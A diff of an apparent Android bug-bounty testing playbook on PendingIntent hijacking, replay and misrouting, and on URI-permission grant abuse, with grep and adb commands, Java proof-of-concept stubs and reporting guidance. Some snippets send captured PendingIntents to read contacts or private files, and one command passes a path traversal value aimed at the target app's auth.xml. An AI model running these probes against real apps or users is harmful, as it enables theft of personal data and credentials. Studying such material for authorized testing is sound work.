+  adb -s "$SERIAL" shell am compat enable BLOCK_MUTABLE_IMPLICIT_PENDING_INTENT com.target.app   # debuggable build
+  adb -s "$SERIAL" logcat | grep -iE 'IllegalArgumentException.*PendingIntent|BLOCK_MUTABLE_IMPLICIT'
   ```
 - **Proof:** The call site plus the D08-037 exploitation of that specific PendingIntent. Its presence alone
   is a finding worth stating, but do not file it alone — file it as the lede of the redirection report, the
@@ -1669,9 +1722,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   obtain, so it is a realistic precondition, not a theoretical one.
 - **How:**
   ```bash
-  grep -rn 'setContentIntent\|addAction\|NotificationCompat.Builder\|Notification.Builder' out/sources/
-  adb shell dumpsys notification --noredact | grep -iE 'pkg=com.target.app' -A12
-  adb shell cmd notification allow_listener com.attacker.poc/.Listener
+  grep -rn 'setContentIntent\|addAction\|NotificationCompat.Builder\|Notification.Builder' "$DEC/jadx/sources/"
+  adb -s "$SERIAL" shell dumpsys notification --noredact | grep -iE 'pkg=com.target.app' -A12
+  adb -s "$SERIAL" shell cmd notification allow_listener com.attacker.poc/.Listener
   ```
   In the stub listener:
   ```java
@@ -1679,15 +1732,14 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
     Notification n = sbn.getNotification();
     PendingIntent pi = n.contentIntent;                       // or n.actions[i].actionIntent
     Log.i("D08", sbn.getPackageName() + " creator=" + pi.getCreatorPackage());
-    Intent fill = new Intent();
-    fill.setClassName("com.target.app", "com.target.app.internal.AdminActivity");
+    Intent fill = new Intent();                               // no setClassName(): dropped by fillIn (D08-037); the target is reached by resolution or setPackage on a package-less base
     fill.setData(Uri.parse("content://com.android.contacts/data"));
     fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
     try { pi.send(this, 0, fill); } catch (Exception e) { Log.e("D08", "", e); }
   }
   ```
   ```bash
-  adb logcat | grep -E 'D08|sbn'
+  adb -s "$SERIAL" logcat | grep -E 'D08|sbn'
   ```
 - **Proof:** The victim app performing the wrapped action, or handing over a granted URI, triggered from
   your listener process. Contact records in your log read by an app that never requested `READ_CONTACTS` is
@@ -1717,7 +1769,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   notification listener — becomes the sender while the creator stays trusted.
 - **How:**
   ```bash
-  grep -rnE 'getCreatorPackage|getCreatorUid|getTargetPackage|getIntentSender' out/sources/ -B4 -A8
+  grep -rnE 'getCreatorPackage|getCreatorUid|getTargetPackage|getIntentSender' "$DEC/jadx/sources/" -B4 -A8
   ```
   For each hit determine whether the result feeds an `if` that gates a privileged action. Then relay:
   ```java
@@ -1728,7 +1780,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   startActivity(handoff);                                    // sent by YOU
   ```
 - **Proof:** The victim taking the creator-gated branch while the sending process is yours — a logcat line
-  from the victim's handler captured alongside `adb shell ps | grep com.attacker.poc` showing your PID as
+  from the victim's handler captured alongside `adb -s "$SERIAL" shell ps | grep com.attacker.poc` showing your PID as
   the caller. The clean framing: creator says `com.trusted`, sender is `com.attacker.poc`, branch executed.
 - **Escalation:** → D13 auth bypass; → D06 if the gated path is a bound service. This is the
   notification-listener × PendingIntent join in D24.
@@ -1742,7 +1794,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.privilege_escalation` (null); financial replay argues into the programme's payment category |
+| **VRT** | `broken_access_control.privilege_escalation` (varies); financial replay argues into the programme's payment category |
 | **Attacker** | AM-03, AM-04 |
 | **Applies to** | all |
 | **Maps to** | `risks/pending-intent#risk_replaying_pending_intents` — "PendingIntents can be replayed unless the `FLAG_ONE_SHOT` flag is set"; AOSP `PendingIntent.java` — `FLAG_ONE_SHOT`: "this PendingIntent can be used only once … after `send()` is called on it, it will be automatically canceled", and the documented risk that an attacker "could capture and re-use the intent to repeat actions that should only be able to be done once (e.g., one-time transactions, account verifications)"; mindedsecurity `MSTG-PLATFORM-4_2` (bitmask test `$D & 0x40000000 > 0`) |
@@ -1753,8 +1805,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   still replayable.
 - **How:**
   ```bash
-  grep -rn 'PendingIntent.get' out/sources/ | grep -v 'FLAG_ONE_SHOT'
-  grep -rn -B10 'PendingIntent.get' out/sources/ | grep -inE 'pay|order|checkout|charge|transfer|confirm|verify|voucher|coupon|redeem'
+  grep -rn 'PendingIntent.get' "$DEC/jadx/sources/" | grep -v 'FLAG_ONE_SHOT'
+  grep -rn 'PendingIntent.get' "$DEC/jadx/sources/" | grep -vE '1073741824|0x40000000'   # the inlined value — R8 strips the constant name
+  grep -rn -B10 'PendingIntent.get' "$DEC/jadx/sources/" | grep -inE 'pay|order|checkout|charge|transfer|confirm|verify|voucher|coupon|redeem'
   ```
   Use the D08-003 Frida census to read the flags bitmask at creation, then capture the token (notification,
   widget, alarm, exported extra) and:
@@ -1775,7 +1828,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) when the misroute exposes another user's content; `broken_access_control.privilege_escalation` (null) otherwise |
+| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) when the misroute exposes another user's content; `broken_access_control.privilege_escalation` (varies) otherwise |
 | **Attacker** | AM-05 (another user of the same app) for the misrouted-message variant; AM-03 for the extras-swap variant |
 | **Applies to** | all |
 | **Maps to** | AOSP `PendingIntent.java` javadoc, verbatim: "A common mistake people make is to create multiple PendingIntent objects with Intents that only vary in their 'extra' contents, expecting to get a different PendingIntent each time. This does not happen." Matching uses `Intent.filterEquals()` plus the `requestCode` int — extras are **not** part of identity; also "FLAG_UPDATE_CURRENT still works even if FLAG_IMMUTABLE is set"; `develop/ui/views/notifications/build-notification` — "If you reuse a `PendingIntent`, a user might reply to a different conversation than the one they intend" |
@@ -1787,10 +1840,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   contexts, and including when `FLAG_IMMUTABLE` is set.
 - **How:**
   ```bash
-  grep -rn 'FLAG_UPDATE_CURRENT\|requestCode' out/sources/ -B4 -A2
+  grep -rn 'FLAG_UPDATE_CURRENT\|requestCode' "$DEC/jadx/sources/" -B4 -A2
   # PendingIntents built in a loop with a constant request code:
-  grep -rnE 'PendingIntent\.get(Activity|Broadcast|Service)\(\s*\w+,\s*0\s*,' out/sources/ -B10
-  grep -rnE 'PendingIntent\.get(Activity|Service|Broadcast)\([^,]+,\s*([0-9]+)' out/sources/ -A4 | grep -n 'FLAG_UPDATE_CURRENT'
+  grep -rnE 'PendingIntent\.get(Activity|Broadcast|Service)\(\s*\w+,\s*0\s*,' "$DEC/jadx/sources/" -B10
+  grep -rnE 'PendingIntent\.get(Activity|Service|Broadcast)\([^,]+,\s*([0-9]+)' "$DEC/jadx/sources/" -A4 | grep -n 'FLAG_UPDATE_CURRENT'
   ```
   The D08-003 hook prints `rc=` per creation — a constant value across items is the tell. Reproduce:
   post two notifications (or open two orders), act on the second, observe which one the backend sees.
@@ -1809,7 +1862,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for the misroute; `broken_access_control.privilege_escalation` (null) for the retarget |
+| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for the misroute; `broken_access_control.privilege_escalation` (varies) for the retarget |
 | **Attacker** | AM-04 |
 | **Applies to** | all messaging, ticketing and support apps with inline reply |
 | **Maps to** | `develop/ui/views/notifications/build-notification` (the `FLAG_MUTABLE` requirement for direct reply and the requestCode caution); AOSP `PendingIntent.java`; `risks/sender-of-pending-intents` |
@@ -1821,14 +1874,14 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   PendingIntent" here without that analysis — you will be correctly rebutted.
 - **How:**
   ```bash
-  grep -rn -B10 -A4 'RemoteInput\|addRemoteInput\|KEY_TEXT_REPLY' out/sources/
+  grep -rn -B10 -A4 'RemoteInput\|addRemoteInput\|KEY_TEXT_REPLY' "$DEC/jadx/sources/"
   # verify the base Intent sets a component AND a unique requestCode per conversation
   ```
   Then, from the listener stub, capture the reply PendingIntent and fill in a *different* conversation id
   or a different data URI:
   ```java
   Intent fill = new Intent();
-  fill.putExtra("conversation_id", victimOtherThreadId);
+  fill.putExtra("conversation_id", victimOtherThreadId);   // lands only if that key is ABSENT from the base extras (base wins on collision) — check the base first; if present, the misroute needs D08-043
   RemoteInput.addResultsToIntent(action.getRemoteInputs(), fill, results);
   action.actionIntent.send(ctx, 0, fill);
   ```
@@ -1844,20 +1897,21 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.privilege_escalation` (null) |
+| **VRT** | `broken_access_control.privilege_escalation` (varies) |
 | **Attacker** | AM-09 (server content chooses the launch target), AM-03 where the item data comes from an exported provider or the app's cache |
 | **Applies to** | apps with collection-based widgets |
 | **Maps to** | `develop/ui/views/appwidgets` (`setOnClickPendingIntent`, `setPendingIntentTemplate` plus fill-in for collections); `risks/pending-intent`; MASWE-0032 |
 
 - **Test:** Collection widgets use one template PendingIntent plus a per-item `fillInIntent`. The
-  template's unfilled fields are precisely what the fill-in may supply. If the template omits the component
-  or the action, the fill-in supplies it — and widget item data frequently originates from server content
+  template's unfilled fields are precisely what the fill-in may supply. If the template omits the action,
+  data or extras, the fill-in supplies them; a missing component is supplied only when the template was
+  created with `FILL_IN_COMPONENT` (D08-037) — and widget item data frequently originates from server content
   or from the app's own cache. So *content* controls a launch. Widget code lives outside the main feature
   tree, which is why it is rarely reviewed.
 - **How:**
   ```bash
-  grep -rnE 'setPendingIntentTemplate|setOnClickFillInIntent|setOnFillInIntent|RemoteViewsService|RemoteViewsFactory|getViewAt\(' out/sources/ -A10
-  adb shell dumpsys appwidget | sed -n '/Provider/,/Host/p'
+  grep -rnE 'setPendingIntentTemplate|setOnClickFillInIntent|setOnFillInIntent|RemoteViewsService|RemoteViewsFactory|getViewAt\(' "$DEC/jadx/sources/" -A10
+  adb -s "$SERIAL" shell dumpsys appwidget | sed -n '/Provider/,/Host/p'
   ```
   For each `setPendingIntentTemplate`, read the base Intent: does it set component **and** action, or only
   an action? Then feed the widget's data source a crafted item — via a MitM'd response, the app's exported
@@ -1876,7 +1930,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 (any app able to obtain slice permission), plus the app's own hosts |
 | **Applies to** | apps shipping AndroidX Slices — declining in prevalence, so almost never reviewed |
 | **Maps to** | `guide/slices/getting-started` (provider XML, `android.app.slice.category.SLICE`, `onBindSlice`); `risks/pending-intent`; MASWE-0036 |
@@ -1886,9 +1940,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   attacker-influenceable, the host becomes your launcher — and the slice provider is exported by design.
 - **How:**
   ```bash
-  grep -nB2 -A10 'android.app.slice.category.SLICE' out/AndroidManifest.merged.xml
-  grep -rnE 'extends SliceProvider|onBindSlice|onCreateSliceProvider|onMapIntentToUri|SliceAction|createDeeplink|primaryAction|grantSlicePermission|checkSlicePermission' out/sources/ -A8
-  adb shell content query --uri 'content://com.target.app/<path>'
+  grep -nB2 -A10 'android.app.slice.category.SLICE' "$DEC/AndroidManifest.merged.xml"
+  grep -rnE 'extends SliceProvider|onBindSlice|onCreateSliceProvider|onMapIntentToUri|SliceAction|createDeeplink|primaryAction|grantSlicePermission|checkSlicePermission' "$DEC/jadx/sources/" -A8
+  adb -s "$SERIAL" shell content query --uri 'content://com.target.app/<path>'
   ```
 - **Proof:** A slice URI path that maps to an internal screen, plus the corresponding PendingIntent target
   recorded from the bound slice, plus non-idempotent behaviour observable from the bind (a proxy request, a
@@ -1906,7 +1960,6 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) |
 | **Attacker** | AM-03 (no user grant needed — this is the acquisition path that beats D08-040 on rating) |
 | **Applies to** | all |
-| **Requires** | exported-activity, exported-service, exported-receiver |
 | **Maps to** | `risks/pending-intent`; `risks/sender-of-pending-intents`; Oversecured Samsung category "PendingIntent Hijacking" (IDs 167, 178, 179, 180); AOSP "AIDL overview" |
 
 - **Test:** The notification drawer is the famous acquisition route and the weakest one, because it costs a
@@ -1915,10 +1968,11 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   third-party SDK. Enumerate every way a `PendingIntent` or `IntentSender` leaves the process.
 - **How:**
   ```bash
-  grep -rnE 'putExtra\([^,]+,\s*\w*[Pp]endingIntent|setContentIntent|addAction\(|getIntentSender\(|IntentSender' out/sources/
-  grep -rn 'PendingIntent' out/sources/ | grep -iE 'aidl|Stub|onBind|Parcel|writeToParcel'
-  ls out/sources/**/I*$Stub* 2>/dev/null; grep -rn 'extends .*\$Stub' out/sources/ -A20 | grep -in 'PendingIntent'
-  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'
+  grep -rnE 'putExtra\([^,]+,\s*\w*[Pp]endingIntent|setContentIntent|addAction\(|getIntentSender\(|IntentSender' "$DEC/jadx/sources/"
+  grep -rn 'PendingIntent' "$DEC/jadx/sources/" | grep -iE 'aidl|Stub|onBind|Parcel|writeToParcel'
+  find "$DEC/jadx/sources/" -name 'I*$Stub*' -o -name '*$Stub$Proxy*' | tee "$E/logs/D08-047-stubs.txt" | wc -l   # single quotes keep $Stub literal; ** needs globstar
+  grep -rn 'extends .*\$Stub' "$DEC/jadx/sources/" -A20 | grep -in 'PendingIntent'
+  adb -s "$SERIAL" shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'
   ```
   Then bind or broadcast from the stub and pull the token out of the reply Bundle.
 - **Proof:** Your unprivileged app in possession of a live PendingIntent created by the victim — print
@@ -1936,7 +1990,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the phishing outcome argues toward `server_side_injection.content_spoofing.external_authentication_injection` (P4) only if the triager insists — lead with credential capture instead |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); the phishing outcome argues toward `server_side_injection.content_spoofing.external_authentication_injection` (P4) only if the triager insists — lead with credential capture instead |
 | **Attacker** | AM-03, AM-08 |
 | **Applies to** | targetSdk 34+ for the sender opt-in, 35+ for the creator opt-in; `MODE_BACKGROUND_ACTIVITY_START_ALLOW_IF_VISIBLE` is available from SDK 36; `IntentSender.sendIntent()` sender opt-in is documented as arriving at API 37+ |
 | **Requires** | targetsdk>=34 |
@@ -1948,18 +2002,20 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   will. That is the substrate for StrandHogg-style phishing on modern devices.
 - **How:**
   ```bash
-  grep -rnE 'setPendingIntent(Creator)?BackgroundActivityStartMode|MODE_BACKGROUND_ACTIVITY_START_(ALLOWED|DENIED|ALLOW_IF_VISIBLE)|BIND_ALLOW_ACTIVITY_STARTS' out/sources/
+  grep -rnE 'setPendingIntent(Creator)?BackgroundActivityStartMode|MODE_BACKGROUND_ACTIVITY_START_(ALLOWED|DENIED|ALLOW_IF_VISIBLE)|BIND_ALLOW_ACTIVITY_STARTS' "$DEC/jadx/sources/"
   ```
   ```kotlin
   StrictMode.setVmPolicy(StrictMode.VmPolicy.Builder()
       .detectBlockedBackgroundActivityLaunch().penaltyLog().build())   // Android 16+
   ```
   ```bash
-  adb logcat -s ActivityTaskManager | grep -E 'realCallingPackage|callingPackage|BAL'
+  adb -s "$SERIAL" logcat -s ActivityTaskManager | grep -E 'realCallingPackage|callingPackage|BAL'
   ```
 - **Proof:** `ActivityTaskManager` log lines naming `realCallingPackage` (sender) and `callingPackage`
   (creator), with a background activity actually appearing on screen while the attacker app has no visible
-  window. Record the mode constant found in code next to the log line.
+  window. Record the mode constant found in code next to the log line. The shell is exempt from
+  background-activity-launch limits, so `adb shell am start` neither proves nor refutes a BAL gate — the
+  `ActivityTaskManager` BAL line must come from an app-UID sender.
 - **Escalation:** → D04 UI redress and credential capture; also a `bindService()` with
   `BIND_ALLOW_ACTIVITY_STARTS` exposed to an untrusted binder client is the same grant by another route.
 - **Ruled out when:** No opt-in call exists (the platform default denies), or the only call uses
@@ -1983,9 +2039,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   at an intent-forwarding activity. Audit the replacement, not the original.
 - **How:**
   ```bash
-  adb logcat -d | grep -i 'Indirect notification activity start (trampoline) from'
-  adb shell am compat enable NOTIFICATION_TRAMPOLINE_BLOCK com.target.app     # debuggable builds
-  grep -rn 'setContentIntent(' out/sources/ -B6 -A3 | grep -nE 'FLAG_MUTABLE|new Intent\(\)|Redirect|Router|Deeplink|Proxy'
+  adb -s "$SERIAL" logcat -d | grep -i 'Indirect notification activity start (trampoline) from'
+  adb -s "$SERIAL" shell am compat enable NOTIFICATION_TRAMPOLINE_BLOCK com.target.app     # debuggable builds
+  grep -rn 'setContentIntent(' "$DEC/jadx/sources/" -B6 -A3 | grep -nE 'FLAG_MUTABLE|new Intent\(\)|Redirect|Router|Deeplink|Proxy'
   ```
 - **Proof:** A notification action built with `FLAG_MUTABLE` and no component set, or one whose explicit
   component is itself a redirector — plus the D08-037 exploitation of that specific token.
@@ -2011,7 +2067,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   order A charges order B.
 - **How:**
   ```bash
-  grep -rn -B10 'PendingIntent.get' out/sources/ | grep -inE 'pay|order|checkout|charge|transfer|confirm|topup|subscribe'
+  grep -rn -B10 'PendingIntent.get' "$DEC/jadx/sources/" | grep -inE 'pay|order|checkout|charge|transfer|confirm|topup|subscribe'
   ```
   Run both probes against the same token and record the backend state after each.
 - **Proof:** N charges from one confirmation, or a confirmation applied to the wrong order — evidenced in
@@ -2040,10 +2096,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   is also a finding source in its own right — widgets and alarms silently dead after a force-stop.
 - **How:**
   ```bash
-  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # before
-  adb shell am force-stop com.target.app
-  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # after: records gone
-  grep -rn 'wasForceStopped\|ApplicationStartInfo' out/sources/
+  adb -s "$SERIAL" shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # before
+  adb -s "$SERIAL" shell am force-stop com.target.app
+  adb -s "$SERIAL" shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # after: records gone
+  grep -rn 'wasForceStopped\|ApplicationStartInfo' "$DEC/jadx/sources/"
   ```
 - **Proof:** The PendingIntent records present before and absent after in `dumpsys activity intents`.
   Include this in the negative-result register so a failed PendingIntent PoC is recorded as inconclusive
@@ -2071,8 +2127,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 - **How:** From the D08-003 census, list every PendingIntent whose base intent (a) has grant flags set, or
   (b) has no data URI set while being mutable. Then:
   ```java
-  Intent fill = new Intent();
-  fill.setClassName("com.attacker.poc", "com.attacker.poc.LeakActivity");
+  Intent fill = new Intent();     // no setClassName(): fillIn drops a component without FILL_IN_COMPONENT (D08-037) — reach your activity by resolution (stub filter on the base action + content scheme) or setPackage() on a package-less base
   fill.setData(Uri.parse("content://com.target.app.fileprovider/files/session_backup_payload"));
   fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
               | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);
@@ -2104,16 +2159,16 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   needed.
 - **How:**
   ```bash
-  grep -rn 'grantUriPermission(' out/sources/ -B8 -A4
-  grep -rn 'revokeUriPermission(' out/sources/            # the counterpart; its absence is half the finding
-  grep -rn 'getUriForFile(' out/sources/ -B6 -A4          # attacker-supplied path reaching the URI builder
+  grep -rn 'grantUriPermission(' "$DEC/jadx/sources/" -B8 -A4
+  grep -rn 'revokeUriPermission(' "$DEC/jadx/sources/"            # the counterpart; its absence is half the finding
+  grep -rn 'getUriForFile(' "$DEC/jadx/sources/" -B6 -A4          # attacker-supplied path reaching the URI builder
   ```
   Fire it with your own package name and a path you choose:
   ```bash
-  adb shell am start -n com.target.app/.ShareActivity \
+  adb -s "$SERIAL" shell am start -n com.target.app/.ShareActivity \
     --es target_package com.attacker.poc \
     --es path '../../../../data/data/com.target.app/shared_prefs/auth.xml'
-  adb shell dumpsys activity permissions | grep -A5 com.attacker.poc
+  adb -s "$SERIAL" shell dumpsys activity permissions | grep -A5 com.attacker.poc
   ```
   ```
   dz> run app.activity.start --component com.target.app com.target.app.ShareActivity \
@@ -2136,7 +2191,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) or `.for_publicly_accessible_asset` (P1) by payload |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) or `.for_publicly_accessible_asset` (P1) by payload |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | provider |
@@ -2147,11 +2202,12 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   the grant — and you arrange to win by registering a matching filter with a high priority.
 - **How:**
   ```bash
-  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' out/sources/ -B6 \
+  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' "$DEC/jadx/sources/" -B6 \
     | grep -nE 'new Intent\("|setAction\(|createChooser\(|ACTION_SEND|ACTION_VIEW'
-  grep -rn 'new Intent\(\s*"' out/sources/ | grep -v 'setPackage\|setComponent\|setClassName'
-  adb shell cmd package resolve-activity --brief -a android.intent.action.SEND -t 'image/*'
-  adb shell dumpsys package r android.intent.action.SEND
+  grep -rn 'new Intent\(\s*"' "$DEC/jadx/sources/" | grep -v 'setPackage\|setComponent\|setClassName'
+  grep -rnE '(addFlags|setFlags)\([[:space:]]*(1|2|3|64|65|67|128|129|131|195)[[:space:]]*\)' "$DEC/jadx/sources/"   # inlined FLAG_GRANT_* values (R8)
+  adb -s "$SERIAL" shell cmd package resolve-activity --brief -a android.intent.action.SEND -t 'image/*'
+  adb -s "$SERIAL" shell dumpsys package r android.intent.action.SEND
   ```
   Register the competing handler in the stub:
   ```xml
@@ -2171,8 +2227,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```
   Confirm the resolver actually picked you before claiming it:
   ```bash
-  adb shell am start -a android.intent.action.SEND -t 'image/*' -f 0x00000008   # FLAG_DEBUG_LOG_RESOLUTION
-  adb logcat -d | grep -iE 'resolve|Resolver|PackageManager|ActivityTaskManager'
+  adb -s "$SERIAL" shell am start -a android.intent.action.SEND -t 'image/*' -f 0x00000008   # FLAG_DEBUG_LOG_RESOLUTION
+  adb -s "$SERIAL" logcat -d | grep -iE 'resolve|Resolver|PackageManager|ActivityTaskManager'
   ```
 - **Proof:** `adb logcat -s D08` in the attacker app printing the victim's URI and the bytes behind it,
   plus `dumpsys activity permissions` showing the grant to your UID, plus the resolution trace naming your
@@ -2190,7 +2246,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
 | **Attacker** | AM-03 + one user share action |
 | **Applies to** | all; the grant dies on target-app uninstall — state that in the report |
 | **Requires** | provider |
@@ -2201,20 +2257,14 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   read access across reboots and across the target's own notion of "revoked" — until the target explicitly
   calls `revokeUriPermission()`. For a medical record, a contract, an ID scan or a disappearing message,
   the finding is that **delete does not delete**.
-- **How:** Receive a legitimate share into the stub app, then:
-  ```java
-  getContentResolver().takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
-  ```
+- **How:** Settled by D07-027, which carries the reboot and UI-delete procedure; run it there once with the
+  share-received stub and record the share route (which feature issued the persistable grant) on this row.
   ```bash
-  adb reboot && adb wait-for-device
-  adb shell dumpsys activity providers | sed -n '/Granted Uri Permissions/,/^$/p'
-  # then delete the item in the target's UI and re-read from the stub
-  adb shell am start -n com.attacker.poc/.ReReadActivity
-  grep -rnE 'FLAG_GRANT_PERSISTABLE_URI_PERMISSION|revokeUriPermission|grantUriPermission' out/sources/
+  grep -rnE 'FLAG_GRANT_PERSISTABLE_URI_PERMISSION|revokeUriPermission|grantUriPermission' "$DEC/jadx/sources/"
   ```
-- **Proof:** `dumpsys activity providers` listing the persisted grant to the attacker package after a
-  reboot, and the attacker still reading the file bytes after the user deleted the item in the UI. Take the
-  pre-state (item present), the deletion, and the post-state read as three captures.
+- **Proof:** The D07-027 proof — `dumpsys activity permissions` listing the persisted grant to the attacker
+  package after a reboot, and the attacker still reading the file bytes after the user deleted the item in
+  the UI — cited by log path.
 - **Escalation:** → D20 (data retained beyond the user's control); if multiple users' documents are
   reachable through one grant, the PII standard applies.
 - **Ruled out when:** The app never sets `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, or it calls
@@ -2225,8 +2275,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 
 | | |
 |---|---|
-| **Severity ceiling** | Medium |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **Severity ceiling** | Support |
+| **VRT** | as D08-058 — the attribute's absence is the unused mitigation recorded on that row |
 | **Attacker** | AM-03 |
 | **Applies to** | Android 15+ (API 35) for the attribute; the underlying confused deputy works on all versions, which is why its absence on a modern app is worth calling out |
 | **Requires** | exported-activity |
@@ -2234,22 +2284,15 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 
 - **Test:** Android 15 lets an activity declare that the *caller* must already hold permission on any
   `content://` URI it passes in — the platform then enforces it on the data URI, the `ClipData` and
-  `EXTRA_STREAM`. An exported activity that consumes URIs and does not declare it is relying on nothing.
+  `EXTRA_STREAM`. The attribute is the available mitigation for D08-058; this sub-check records its
+  presence or absence per URI-consuming exported activity and has no probe of its own.
 - **How:**
   ```bash
-  grep -nE 'requireContentUriPermissionFromCaller' out/AndroidManifest.merged.xml
-  grep -rn 'checkContentUriPermissionFull\|ComponentCaller' out/sources/
+  grep -nE 'requireContentUriPermissionFromCaller' "$DEC/AndroidManifest.merged.xml"
+  grep -rn 'checkContentUriPermissionFull\|ComponentCaller' "$DEC/jadx/sources/"
   ```
-  Then exercise the confused deputy directly:
-  ```bash
-  adb shell am start -n com.target.app/.ShareReceiverActivity \
-    -a android.intent.action.SEND -t 'text/plain' \
-    --eu android.intent.extra.STREAM \
-    content://com.target.app.fileprovider/internal/shared_prefs/auth.xml
-  ```
-- **Proof:** The activity renders or uploads the contents of a file the **caller** could not read — the
-  exfiltrated bytes in the proxy, while `adb shell cat` of the same path is denied. Then note the absent
-  attribute as the available, unused mitigation.
+- **Proof:** The per-activity table (component | consumes URI from data/ClipData/EXTRA_STREAM | attribute
+  value or absent), attached to the D08-058 row whose probe shows the confused deputy.
 - **Escalation:** → D07/D08-010 when chained to a `FileProvider` with an over-broad `<root-path>`.
 - **Ruled out when:** Every exported URI-consuming activity declares the attribute at an appropriate level,
   **or** validates inbound URIs with `checkUriPermission(uri, Process.myPid(), Process.myUid(), flag)` plus
@@ -2260,7 +2303,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the gate is an auth gate |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); `broken_authentication_and_session_management.authentication_bypass` (P1) if the gate is an auth gate |
 | **Attacker** | AM-03 |
 | **Applies to** | Android 15+ for the APIs; the `onNewIntent` gap is universal and applies to any caller check |
 | **Requires** | exported-activity |
@@ -2272,8 +2315,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   already running — from a different package.
 - **How:**
   ```bash
-  grep -rn 'ComponentCaller\|checkContentUriPermissionFull\|getCallingActivity()\|onNewIntent' out/sources/
-  grep -nE 'launchMode="single(Top|Task|Instance)"' -B6 out/AndroidManifest.merged.xml
+  grep -rn 'ComponentCaller\|checkContentUriPermissionFull\|getCallingActivity()\|onNewIntent' "$DEC/jadx/sources/"
+  grep -nE 'launchMode="single(Top|Task|Instance)"' -B6 "$DEC/AndroidManifest.merged.xml"
   ```
   Drive it: launch the activity legitimately, then from the stub deliver a second intent with a hostile
   payload and no caller identity.
@@ -2289,10 +2332,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) — Critical when the victim's held permission is re-delegated |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) — Critical when the victim's held permission is re-delegated |
 | **Attacker** | AM-03 |
